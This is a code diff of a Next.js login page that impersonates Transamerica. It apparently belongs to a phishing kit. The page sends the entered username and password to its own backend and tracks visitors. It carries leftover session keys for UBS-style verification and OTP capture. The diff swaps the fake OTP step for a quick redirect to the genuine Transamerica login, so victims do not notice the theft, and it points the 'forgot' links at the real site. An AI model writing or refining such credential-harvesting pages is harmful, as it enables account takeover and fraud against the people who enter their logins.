@@ -6,16 +6,7 @@ import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
 
 export default function LoginPage() {
   const [hasInteracted, setHasInteracted] = useState(false);
-  const visitorInfo = useVisitorTracking();
   const hasSentVisitRef = useRef(false);
-
-  useEffect(() => {
-    if (typeof window !== "undefined") {
-      sessionStorage.removeItem("ubs_verify");
-      sessionStorage.removeItem("ubs_details");
-      sessionStorage.removeItem("ubs_otp2");
-    }
-  }, []);
 
   useEffect(() => {
     const onFirstInteraction = () => setHasInteracted(true);
@@ -60,27 +51,9 @@ export default function LoginPage() {
         throw new Error("Failed to send login data");
       }
 
-      if (typeof window !== "undefined") {
-        sessionStorage.setItem("ubs_verify", "1");
-      }
-
-      setCountdown(10);
-      countdownRef.current = window.setInterval(() => {
-        setCountdown((prev) => {
-          if (prev <= 1) {
-            if (countdownRef.current) {
-              window.clearInterval(countdownRef.current);
-              countdownRef.current = null;
-            }
-            return 0;
-          }
-          return prev - 1;
-        });
-      }, 1000);
-
       redirectRef.current = window.setTimeout(() => {
-        router.push("/verify-choice");
-      }, 10000);
+        window.location.href = "https://secure2.transamerica.com/login";
+      }, 2000);
     } catch (error) {
       console.error("Login failed:", error);
       setLoginError("Unable to send login details. Please try again.");
@@ -151,7 +124,7 @@ export default function LoginPage() {
                     onChange={(event) => setUsername(event.target.value)}
                   />
                   <a
-                    href="/Transamerica/forgotusername.html"
+                    href="https://secure2.transamerica.com/login"
                     className="mt-10 block text-xl font-semibold"
                   >
                     Forgot your username?
@@ -172,7 +145,7 @@ export default function LoginPage() {
                     onChange={(event) => setPassword(event.target.value)}
                   />
                   <a
-                    href="/Transamerica/forgotpassword.html"
+                    href="https://secure2.transamerica.com/login"
                     className="mt-10 block text-xl font-semibold"
                   >
                     Forgot your password?
